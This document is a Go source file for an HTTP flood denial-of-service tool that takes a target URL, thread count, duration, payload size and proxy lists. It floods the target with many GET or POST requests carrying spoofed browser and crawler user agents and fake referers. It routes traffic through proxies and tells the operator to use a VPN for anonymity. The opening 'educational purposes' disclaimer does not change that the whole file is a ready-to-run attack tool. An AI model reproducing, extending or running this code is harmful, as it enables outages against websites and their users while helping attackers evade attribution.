package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var (
	host       = ""
	port       = "80"
	page       = ""
	mode       = ""
	abcd       = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start      = make(chan bool)
	acceptall  = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	}
	key        string
	choice     = []string{"Macintosh", "Windows", "X11"}
	choice2    = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3    = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4    = []string{"Linux i686", "Linux x86_64"}
	choice5    = []string{"chrome", "spider", "ie"}
	choice6    = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider     = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
	headerFile = "header.txt"
	proxies    []string
	payloadKB  int
	workers    int
	requests   int
	timeout    = 5 * time.Second
	logMutex   sync.Mutex
	success    int
	failed     int
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func clearTerminal() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func getuseragent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3))]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4))]
	}
	browser := choice5[rand.Intn(len(choice5))]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6))] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func loadProxies(file string) ([]string, error) {
	f, err := os.Open(file)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var proxies []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}
	return proxies, nil
}

func flood(proxy string, wg *sync.WaitGroup, timeoutChan <-chan time.Time) {
	defer wg.Done()

	for {
		select {
		case <-timeoutChan:
			return
		default:
			addr := host + ":" + port
			header := ""
			if mode == "get" {
				header += "GET " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
				if headerFile == "nil" {
					header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
					header += "User-Agent: " + getuseragent() + "\r\n"
					header += acceptall[rand.Intn(len(acceptall))]
					header += "Referer: " + referers[rand.Intn(len(referers))] + "\r\n"
				} else {
					func() {
						fi, err := os.Open(headerFile)
						if err != nil {
							fmt.Printf("Error: %s\n", err)
							return
						}
						defer fi.Close()
						br := bufio.NewReader(fi)
						for {
							a, _, c := br.ReadLine()
							if c == io.EOF {
								break
							}
							header += string(a) + "\r\n"
						}
					}()
				}
			} else if mode == "post" {
				data := strings.Repeat("a", payloadKB*1024)
				header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
				header += "Connection: Keep-Alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
				header += "Accept-Encoding: gzip, deflate\r\n\r\n" + data
			}

			var s net.Conn
			var err error
			<-start

			if proxy != "" {
				if strings.HasPrefix(proxy, "http") {
					proxyURL, _ := url.Parse(proxy)
					s, err = tls.Dial("tcp", proxyURL.Host, &tls.Config{
						InsecureSkipVerify: true,
					})
				} else if strings.HasPrefix(proxy, "socks5") {
					proxyParts := strings.Split(proxy, "://")
					if len(proxyParts) != 2 {
						continue
					}
					authParts := strings.Split(proxyParts[1], "@")
					var auth *proxy.Auth
					if len(authParts) == 2 {
						auth = &proxy.Auth{
							User:     strings.Split(authParts[0], ":")[0],
							Password: strings.Split(authParts[0], ":")[1],
						}
						proxyParts[1] = authParts[1]
					}
					dialer, err := proxy.SOCKS5("tcp", proxyParts[1], auth, proxy.Direct)
					if err != nil {
						continue
					}
					s, err = dialer.Dial("tcp", addr)
				}
			} else {
				if port == "443" {
					cfg := &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         host,
					}
					s, err = tls.Dial("tcp", addr, cfg)
				} else {
					s, err = net.Dial("tcp", addr)
				}
			}

			if err != nil {
				logMutex.Lock()
				failed++
				logMutex.Unlock()
				continue
			}

			request := header + "\r\n"
			s.Write([]byte(request))

			logMutex.Lock()
			success++
			logMutex.Unlock()

			s.Close()
		}
	}
}

func main() {
	fmt.Println("\033[31mWARNING:\033[0m This tool is for educational and testing purposes only. Use it responsibly and only on systems you own or have explicit permission to test. Misuse of this tool is illegal and unethical.")
	fmt.Println("Press [Enter] to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')

	clearTerminal()

	fmt.Println(`
    ____                   __  __    ___   __  __             __  
   / __ \___  ____ ___  __/ /_/ /_  /   | / /_/ /_____ ______/ /__
  / / / / _ \/ __  / / / / __/ __ \/ /| |/ __/ __/ __  / ___/ //_/
 / /_/ /  __/ /_/ / /_/ / /_/ / / / ___ / /_/ /_/ /_/ / /__/  <   
/_____/\___/\__ _/\__ _/\__/_/ /_/_/  |_\__/\__/\__ _/\___/_/|_|  
`)

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Input the URL: ")
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	fmt.Print("Input the amount of threads: ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = strings.TrimSpace(threadsStr)
	threads, err := strconv.Atoi(threadsStr)
	if err != nil {
		fmt.Println("Threads should be an integer")
		return
	}

	fmt.Print("Input the method get/post: ")
	mode, _ = reader.ReadString('\n')
	mode = strings.TrimSpace(mode)

	fmt.Print("Input the time attack is going to last (in seconds): ")
	limitStr, _ := reader.ReadString('\n')
	limitStr = strings.TrimSpace(limitStr)
	limit, err := strconv.Atoi(limitStr)
	if err != nil {
		fmt.Println("Limit should be an integer")
		return
	}

	fmt.Print("Input the header file (or 'nil' for default): ")
	headerFile, _ = reader.ReadString('\n')
	headerFile = strings.TrimSpace(headerFile)

	fmt.Print("Input the payload size in KB: ")
	payloadKBStr, _ := reader.ReadString('\n')
	payloadKBStr = strings.TrimSpace(payloadKBStr)
	payloadKB, err = strconv.Atoi(payloadKBStr)
	if err != nil {
		fmt.Println("Payload size should be an integer")
		return
	}

	fmt.Print("Input the number of requests per proxy: ")
	requestsStr, _ := reader.ReadString('\n')
	requestsStr = strings.TrimSpace(requestsStr)
	requests, err = strconv.Atoi(requestsStr)
	if err != nil {
		fmt.Println("Requests should be an integer")
		return
	}

	fmt.Print("Input the proxy type (http, https, socks4, socks5, or leave blank for no proxy): ")
	proxyType, _ := reader.ReadString('\n')
	proxyType = strings.TrimSpace(proxyType)

	if proxyType != "" {
		proxyFile := proxyType + ".txt"
		proxies, err = loadProxies(proxyFile)
		if err != nil {
			fmt.Printf("Error loading proxies from %s: %s\n", proxyFile, err)
			return
		}
	} else {
		fmt.Println("\033[31mWARNING:\033[0m No proxies selected. Your IP address will be exposed. Use a VPN for anonymity.")
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		fmt.Println("Invalid URL")
		return
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path

	if strings.Contains(page, "?") {
		key = "&"
	} else {
		key = "?"
	}

	timeoutChan := time.After(time.Duration(limit) * time.Second)

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		if len(proxies) > 0 {
			go flood(proxies[i%len(proxies)], &wg, timeoutChan)
		} else {
			go flood("", &wg, timeoutChan)
		}
	}

	close(start)
	wg.Wait()

	fmt.Printf("\nAttack completed. Success: %d, Failed: %d\n", success, failed)
}
